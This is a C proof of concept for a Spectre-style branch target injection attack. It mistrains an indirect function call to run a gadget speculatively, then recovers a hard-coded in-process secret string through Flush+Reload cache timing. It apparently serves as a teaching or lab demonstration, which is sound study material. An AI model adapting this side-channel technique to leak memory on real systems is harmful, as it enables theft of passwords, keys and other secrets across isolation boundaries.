#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_THRESHOLD (100)
#define DELTA 1024

uint8_t array[256 * 4096];
char *secret = "CACHE ME IF YOU CAN";

void flushCache()
{

  int i;
  for (i = 0; i < 256; i++)
    array[i * 4096 + DELTA] = 1;

  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 4096 + DELTA]);
}

int reloadCache()
{

  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;

  for (i = 0; i < 256; i++)
  {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 < CACHE_THRESHOLD && i != 0)
    {
      printf("The secret %d was stored in cache. %c\n", i, i);
      return i;
    }
  }

  return 0;
}

void (*target)(char *);
int temp;

void gadget(char *addr)
{
  temp = array[(*addr) * 4096 + DELTA];
}

void innocent(char *addr)
{
  printf("Innocent\n");
}

void victim(char *addr)
{
  target(addr);
}

int main()
{
  char *addr_secret = secret;
  int len = 19;
  int i, z, t, found = 0;
  char decoy = 'Z';
  char result[19];
  while (found != len)
  {
    t = 0;
    flushCache();

    for (i = 0; i < 50; i++)
    {
      target = gadget;
      victim(&decoy);
    }

    for (i = 0; i < 256; i++)
      _mm_clflush(&array[i * 4096 + DELTA]);
    for (z = 0; z < 100; z++)
      ;
    usleep(10);
    target = innocent;
    victim(addr_secret);
    t = reloadCache();
    if (t != 0)
    {
      addr_secret++;
      found++;
    }
  }

  return 0;
}
